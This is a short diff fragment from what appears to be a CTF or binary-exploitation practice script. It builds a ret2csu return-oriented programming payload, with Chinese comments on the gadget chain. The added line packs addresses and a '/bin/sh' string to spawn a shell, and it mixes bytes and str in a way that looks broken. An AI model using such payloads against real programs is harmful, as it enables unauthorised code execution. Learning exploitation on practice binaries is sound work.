@@ -476,7 +476,7 @@ def ret2csu():
     #后csu继续 ： call ds:[r12+rbx*8]
     #即csu_beg_addr 后返回到r12+rbx*8处
 
-    payload = 'string'
+    payload = p64(ret_addr)+b"/bin/sh\x00"+'string'
     payload += p64(csu_end_addr)       #从rbx。。。赋值开始
     payload += p64(0)+p64(1)+p64(binsh)
     #payload += p64(0)+p64(1)+p64(pop_rdi_ret_addr)+p64(0)
